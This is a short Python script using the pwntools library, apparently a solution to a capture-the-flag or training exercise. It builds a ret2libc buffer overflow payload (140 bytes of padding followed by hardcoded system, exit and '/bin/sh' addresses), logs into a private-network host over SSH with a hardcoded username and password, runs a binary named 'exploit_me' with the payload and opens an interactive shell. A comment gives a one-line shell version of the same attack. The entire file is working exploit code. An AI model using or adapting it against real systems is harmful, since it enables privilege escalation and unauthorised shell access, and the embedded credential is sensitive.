from pwn import *

# system offset --> 0003f060
# libc loaded @ 0xb7e2c000
# system @ 0xb7e6b060

# "/bin/sh" offset --> 1444952 - 0x160c58
# libc loaded @ 0xb7e2c000
# "/bin/sh" @ 0xb7f8cc58

# exit offset --> 00032be0
# exit @ 0xb7e5ebe0

system_addr = b'\x60\xb0\xe6\xb7'
exit_addr = b'\xe0\xeb\xe5\xb7'
bin_sh = b'\x58\xcc\xf8\xb7'


payload = b'A' * 140

payload += system_addr
payload += exit_addr
payload += bin_sh

s = ssh(host='192.168.1.7', port=22, user="zaz", password="646da671ca01bb5d84dbb5fb2238dc8e")
p = s.process(['/home/zaz/exploit_me', payload])

p.interactive()


# ./exploit_me $(python -c "print('A' * 140 + '\x60\xb0\xe6\xb7' + '\xe0\xeb\xe5\xb7' + '\x58\xcc\xf8\xb7')")
